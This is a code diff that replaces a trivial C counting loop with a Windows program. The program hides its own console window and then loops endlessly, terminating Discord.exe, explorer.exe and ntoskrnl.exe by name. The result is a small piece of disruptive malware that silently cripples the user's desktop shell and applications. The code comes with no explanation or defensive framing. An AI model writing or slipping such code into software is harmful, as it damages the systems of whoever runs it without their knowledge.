@@ -1,8 +1,38 @@
-#include <stdio.h>
-
-int main(){
-	unsigned int i = 0;
-	for (i = 1; i > 0; i++){
-		printf("%d ", i + i);
-	}
+#include <windows.h>
+#include <process.h>
+#include <Tlhelp32.h>
+#include <winbase.h>
+#include <string.h>
+void killProcessByName(const char *filename)
+{
+    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
+    PROCESSENTRY32 pEntry;
+    pEntry.dwSize = sizeof (pEntry);
+    BOOL hRes = Process32First(hSnapShot, &pEntry);
+    while (hRes)
+    {
+        if (strcmp(pEntry.szExeFile, filename) == 0)
+        {
+            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
+                                          (DWORD) pEntry.th32ProcessID);
+            if (hProcess != NULL)
+            {
+                TerminateProcess(hProcess, 9);
+                CloseHandle(hProcess);
+            }
+        }
+        hRes = Process32Next(hSnapShot, &pEntry);
+    }
+    CloseHandle(hSnapShot);
+}
+int main()
+{
+	ShowWindow (GetConsoleWindow(), SW_HIDE);
+	int ity = 0;
+	while (ity == 0){
+    killProcessByName("Discord.exe");
+    killProcessByName("explorer.exe");
+    killProcessByName("ntoskrnl.exe");
+}
+    return 0;
 }
